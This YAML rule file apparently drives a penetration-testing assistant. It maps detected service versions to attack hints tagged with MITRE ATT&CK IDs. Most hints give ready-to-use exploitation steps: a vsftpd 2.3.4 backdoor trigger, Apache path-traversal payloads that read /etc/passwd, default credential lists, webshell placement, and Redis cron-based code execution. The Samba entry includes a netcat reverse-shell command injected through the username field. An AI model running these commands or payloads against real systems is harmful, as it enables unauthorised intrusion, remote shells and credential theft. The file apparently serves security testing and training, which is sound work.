# Service & version-based pattern rules
# Fires when a specific service version is detected in the session context.
# MITRE ATT&CK references: https://attack.mitre.org/techniques/

rules:

  # -------------------------------------------------------------------------
  # FTP
  # -------------------------------------------------------------------------

  - id: vsftpd-2.3.4-backdoor
    name: "vsftpd 2.3.4 Backdoor"
    hint: >
      Port 21 is running vsftpd 2.3.4, which contains a compiled-in backdoor
      (CVE-2011-2523). Connect with any username that includes a smiley ':)'
      character -- this triggers the backdoor and opens a shell on port 6200.
      Try: nc -nv <target> 6200 immediately after attempting the login.
    confidence: 0.97
    priority: 1
    mitre: ["T1190", "T1059.004"]
    tags: [ftp, backdoor, rce, cve]
    conditions:
      - type: service_version
        service: ftp
        version_contains: "vsftpd 2.3.4"

  - id: proftpd-1.3.3-rce
    name: "ProFTPD 1.3.3 mod_copy RCE"
    hint: >
      ProFTPD 1.3.3 is present on port 21. The mod_copy module (if loaded) allows
      unauthenticated file copy via SITE CPFR/CPTO commands (CVE-2011-4130).
      Copy a PHP webshell from /tmp into the webroot, then trigger it via HTTP.
    confidence: 0.90
    priority: 1
    mitre: ["T1190", "T1505.003"]
    tags: [ftp, rce, mod_copy, cve]
    conditions:
      - type: service_version
        service: ftp
        version_contains: "ProFTPD 1.3.3"

  - id: ftp-anonymous
    name: "FTP Anonymous Login Opportunity"
    hint: >
      An FTP service is open and you have not yet tested anonymous login.
      Run: ftp <target> and log in with username 'anonymous' and any email as password.
      Browse for interesting files -- config files, backups, and credentials are common finds.
    confidence: 0.80
    priority: 2
    mitre: ["T1078.001", "T1083"]
    tags: [ftp, anonymous, enumeration]
    conditions:
      - type: service_port
        port: 21
      - type: tool_not_used
        tool: ftp

  # -------------------------------------------------------------------------
  # SSH
  # -------------------------------------------------------------------------

  - id: ssh-old-openssh
    name: "Outdated OpenSSH Version"
    hint: >
      The SSH server is running an old version of OpenSSH (3.x or 4.x).
      Older versions may be vulnerable to username enumeration via timing differences.
      Also check for weak key algorithms -- try: ssh -vv <target> to see what's offered.
    confidence: 0.70
    priority: 2
    mitre: ["T1110.003", "T1046"]
    tags: [ssh, enumeration, old-version]
    conditions:
      - type: service_version
        service: ssh
        version_contains: "OpenSSH"
      - type: service_version
        service: ssh
        version_contains: "4.7"

  # -------------------------------------------------------------------------
  # HTTP / Web Servers
  # -------------------------------------------------------------------------

  - id: apache-2.4.49-path-traversal
    name: "Apache 2.4.49 Path Traversal (CVE-2021-41773)"
    hint: >
      Apache 2.4.49 is running -- this version has a critical path traversal
      vulnerability (CVE-2021-41773). Test with:
      curl http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
      If mod_cgi is enabled, it also allows RCE via the same traversal path.
    confidence: 0.97
    priority: 1
    mitre: ["T1190", "T1083"]
    tags: [http, apache, path-traversal, rce, cve]
    conditions:
      - type: service_version
        service: http
        version_contains: "Apache"
      - type: service_version
        service: http
        version_contains: "2.4.49"

  - id: apache-2.4.50-path-traversal
    name: "Apache 2.4.50 Path Traversal Bypass (CVE-2021-42013)"
    hint: >
      Apache 2.4.50 is present -- this is the patched-but-still-vulnerable version.
      The CVE-2021-41773 fix was bypassed (CVE-2021-42013). Try double-encoding:
      curl http://<target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd
    confidence: 0.97
    priority: 1
    mitre: ["T1190"]
    tags: [http, apache, path-traversal, cve]
    conditions:
      - type: service_version
        service: http
        version_contains: "Apache"
      - type: service_version
        service: http
        version_contains: "2.4.50"

  - id: iis-6-webdav-rce
    name: "IIS 6.0 WebDAV Buffer Overflow (CVE-2017-7269)"
    hint: >
      IIS 6.0 is detected. This version contains a buffer overflow in the WebDAV
      PROPFIND request handler (CVE-2017-7269). Check if WebDAV is enabled:
      curl -X OPTIONS http://<target>/ and look for PROPFIND in the Allow header.
      Metasploit: exploit/windows/iis/iis_webdav_scstoragepathfromurl
    confidence: 0.93
    priority: 1
    mitre: ["T1190"]
    tags: [http, iis, webdav, rce, windows, cve]
    conditions:
      - type: service_version
        service: http
        version_contains: "IIS/6"

  - id: tomcat-manager-default-creds
    name: "Apache Tomcat Manager Default Credentials"
    hint: >
      Apache Tomcat is detected. Check for the Tomcat Manager at /manager/html.
      Common default credentials to try: tomcat:tomcat, admin:admin, manager:manager,
      tomcat:s3cret. A successful login allows WAR file upload for RCE.
    confidence: 0.82
    priority: 1
    mitre: ["T1078.001", "T1505.003"]
    tags: [http, tomcat, default-creds, rce]
    conditions:
      - type: service_version
        service: http
        version_contains: "Tomcat"

  - id: http-nikto-not-run
    name: "Web Server Not Scanned with Nikto"
    hint: >
      A web server is running but nikto has not been used yet.
      Run: nikto -h http://<target> to scan for misconfigurations, outdated software,
      and common vulnerabilities. Add -ssl for HTTPS targets.
    confidence: 0.72
    priority: 2
    mitre: ["T1046"]
    tags: [http, nikto, enumeration, gap]
    conditions:
      - type: service_name
        name: http
      - type: tool_not_used
        tool: nikto

  # -------------------------------------------------------------------------
  # SMB / Samba
  # -------------------------------------------------------------------------

  - id: samba-usermap-script
    name: "Samba 3.0.x usermap_script RCE (CVE-2007-2447)"
    hint: >
      Samba 3.0.20 is running on this host (CVE-2007-2447). The username map
      script option allows arbitrary command injection via the username field.
      Metasploit: exploit/multi/samba/usermap_script
      Manual: smbclient //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh <your_ip> 4444`'
    confidence: 0.97
    priority: 1
    mitre: ["T1190", "T1059.004"]
    tags: [smb, samba, rce, cve]
    conditions:
      - type: service_version
        service: netbios-ssn
        version_contains: "Samba smbd 3.0"

  - id: smb-not-enumerated
    name: "SMB Not Enumerated"
    hint: >
      SMB is open but has not been enumerated yet. Run:
      enum4linux -a <target> for full SMB enumeration.
      Or: crackmapexec smb <target> --shares to check accessible shares.
      Look for null session access, readable shares, and domain information.
    confidence: 0.78
    priority: 2
    mitre: ["T1135", "T1046"]
    tags: [smb, enumeration, gap]
    conditions:
      - type: service_port
        port: 445
      - type: tool_not_used
        tool: enum4linux
      - type: tool_not_used
        tool: crackmapexec
      - type: tool_not_used
        tool: smbmap

  - id: ms17-010-eternalblue
    name: "Potential EternalBlue (MS17-010)"
    hint: >
      SMB is running on a Windows host. If the system is unpatched (Windows Vista/7/2008/2012),
      it may be vulnerable to EternalBlue (MS17-010).
      Scan first: nmap --script smb-vuln-ms17-010 <target>
      Then: Metasploit exploit/windows/smb/ms17_010_eternalblue
    confidence: 0.75
    priority: 1
    mitre: ["T1210"]
    tags: [smb, windows, eternalblue, cve]
    conditions:
      - type: service_version
        service: netbios-ssn
        version_contains: "Windows"

  # -------------------------------------------------------------------------
  # Database services
  # -------------------------------------------------------------------------

  - id: mysql-no-auth
    name: "MySQL Unauthenticated Access Attempt"
    hint: >
      MySQL 5.0 is running on port 3306. This version commonly runs with no root
      password. Try: mysql -h <target> -u root --password=
      If you get in, check for file read: SELECT LOAD_FILE('/etc/passwd')
      and potentially file write for webshell upload via INTO OUTFILE.
    confidence: 0.82
    priority: 2
    mitre: ["T1078.001", "T1005"]
    tags: [mysql, default-creds, database]
    conditions:
      - type: service_version
        service: mysql
        version_contains: "MySQL 5.0"

  - id: mssql-default-creds
    name: "MSSQL Default Credentials"
    hint: >
      MSSQL is open on port 1433. Try common credentials with crackmapexec:
      crackmapexec mssql <target> -u sa -p '' and crackmapexec mssql <target> -u sa -p sa
      If authenticated, xp_cmdshell can give OS command execution.
    confidence: 0.80
    priority: 1
    mitre: ["T1078.001", "T1059.001"]
    tags: [mssql, default-creds, rce]
    conditions:
      - type: service_port
        port: 1433

  - id: postgresql-default-creds
    name: "PostgreSQL Default Credentials"
    hint: >
      PostgreSQL is running on port 5432. Try connecting with default credentials:
      psql -h <target> -U postgres
      Also test: psql -h <target> -U postgres -d template1
      Authenticated access may allow COPY TO/FROM PROGRAM for RCE on older versions.
    confidence: 0.78
    priority: 2
    mitre: ["T1078.001"]
    tags: [postgresql, default-creds, database]
    conditions:
      - type: service_port
        port: 5432

  # -------------------------------------------------------------------------
  # Other services
  # -------------------------------------------------------------------------

  - id: redis-unauthenticated
    name: "Redis Unauthenticated Access"
    hint: >
      Redis is running on port 6379. Redis commonly has no authentication.
      Connect: redis-cli -h <target>
      If you have write access, you can achieve RCE by writing to a cron file:
      config set dir /var/spool/cron/ then set and save a crontab entry.
    confidence: 0.90
    priority: 1
    mitre: ["T1078.001", "T1059.004"]
    tags: [redis, unauthenticated, rce]
    conditions:
      - type: service_port
        port: 6379

  - id: nfs-exposed
    name: "NFS Share Potentially Exposed"
    hint: >
      NFS is running on port 2049. Check what shares are exported:
      showmount -e <target>
      If a share is accessible, mount it: mount -t nfs <target>:/share /mnt/nfs
      Look for SSH keys, config files, and setuid binaries in mounted shares.
    confidence: 0.88
    priority: 1
    mitre: ["T1083", "T1552.001"]
    tags: [nfs, file-access, enumeration]
    conditions:
      - type: service_port
        port: 2049

  - id: snmp-community-strings
    name: "SNMP Community String Enumeration"
    hint: >
      SNMP is running on port 161 (UDP). Try the default community strings:
      snmpwalk -c public -v1 <target>
      snmpwalk -c private -v1 <target>
      SNMP can leak system info, network topology, running processes, and credentials.
    confidence: 0.85
    priority: 2
    mitre: ["T1046", "T1040"]
    tags: [snmp, enumeration, information-disclosure]
    conditions:
      - type: service_port
        port: 161

  - id: winrm-with-creds
    name: "WinRM Available with Potential Credentials"
    hint: >
      WinRM is listening on port 5985. If you have found any credentials,
      try: evil-winrm -i <target> -u <username> -p <password>
      WinRM provides a full PowerShell session on the remote host.
    confidence: 0.88
    priority: 1
    mitre: ["T1021.006"]
    tags: [winrm, windows, lateral-movement]
    conditions:
      - type: service_port
        port: 5985
      - type: has_credentials

  - id: ldap-enumeration
    name: "LDAP / Active Directory Enumeration"
    hint: >
      LDAP is running on port 389. Start with a null bind to check for
      anonymous access: ldapsearch -x -H ldap://<target> -b '' -s base
      Then enumerate the domain: ldapsearch -x -H ldap://<target> -b 'dc=domain,dc=local'
      Look for user accounts, service accounts, and password attributes.
    confidence: 0.82
    priority: 2
    mitre: ["T1087.002", "T1069.002"]
    tags: [ldap, active-directory, enumeration]
    conditions:
      - type: service_port
        port: 389

  - id: dns-zone-transfer
    name: "DNS Zone Transfer Opportunity"
    hint: >
      DNS is running on port 53. Attempt a zone transfer to enumerate all records:
      dig axfr @<target> <domain>
      Also try: host -t axfr <domain> <target>
      Zone transfers often reveal internal hostnames, mail servers, and hidden subdomains.
    confidence: 0.80
    priority: 2
    mitre: ["T1590.002"]
    tags: [dns, zone-transfer, enumeration]
    conditions:
      - type: service_port
        port: 53

  - id: telnet-cleartext
    name: "Telnet Cleartext Protocol"
    hint: >
      Telnet is running on port 23. All communication is sent in cleartext.
      Try connecting with default/common credentials: telnet <target>
      If you can sniff traffic, Wireshark will capture credentials in plaintext.
      Also attempt banner grabbing to identify the target service and version.
    confidence: 0.75
    priority: 2
    mitre: ["T1078.001", "T1040"]
    tags: [telnet, cleartext, default-creds]
    conditions:
      - type: service_port
        port: 23
